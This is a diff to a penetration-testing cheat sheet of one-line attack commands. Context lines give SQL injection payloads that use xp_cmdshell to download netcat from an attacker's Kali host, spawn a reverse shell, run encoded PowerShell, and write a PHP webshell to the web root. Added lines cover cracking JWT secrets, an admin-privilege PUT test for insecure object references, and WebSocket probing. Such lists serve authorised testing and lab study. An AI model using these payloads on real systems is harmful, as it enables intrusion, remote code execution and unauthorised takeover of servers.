@@ -108,4 +108,11 @@ MSSQL Download Binary:';EXEC xp_cmdshell "certutil -urlcache -f http://<kali>/nc
 MSSQL Reverse Shell:';EXEC xp_cmdshell "C:\Windows\Temp\nc64.exe <kali> 4444 -e C:\Windows\System32\cmd.exe";-- #spawn reverse shell
 MSSQL Execute Encoded PowerShell:';EXEC xp_cmdshell 'powershell -e <base64>';-- #execute encoded PowerShell reverse shell via xp_cmdshell
 PHP Backdoor Upload via SQL:' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null INTO OUTFILE '/var/www/html/webshell.php' #upload PHP webshell via SQL injection
-Recursive Web Download from Directory Listing(wget):wget -r -np -nH --cut-dirs=N http://<target>:<port>/ #recursively download website content without ascending to parent directories; kali-machine
+JWT & API Testing:Recursive Web Download from Directory Listing(wget):wget -r -np -nH --cut-dirs=N http://<target>:<port>/ #recursively download website content without ascending to parent directories; kali-machine
+JWT & API Testing:jwt_tool <JWT_TOKEN> -t http://<target>:<port> -rh "Authorization: Bearer <JWT>" -M at # test JWT token for vulnerabilities; kali-machine
+JWT & API Testing:jwt_tool <JWT_TOKEN> -C -d <wordlist1> # crack JWT secret; kali-machine
+JWT & API Testing:curl -X OPTIONS http://<target>:<port>/api/endpoint -v # check allowed HTTP methods on API endpoint; kali-machine
+JWT & API Testing:curl -X PUT -d '{"admin":true}' -H "Content-Type: application/json" http://<target>:<port>/api/user/1 # test insecure direct object references; kali-machine
+WebSocket Testing:websocat ws://<target>:<port>/ws # connect to WebSocket for manual testing; kali-machine
+WebSocket Testing:wscat -c ws://<target>:<port>/ws # alternative WebSocket client; kali-machine
+WebSocket Testing:curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Host: <target>" -H "Origin: http://<target>" http://<target>:<port>/ # test WebSocket upgrade manually; kali-machine
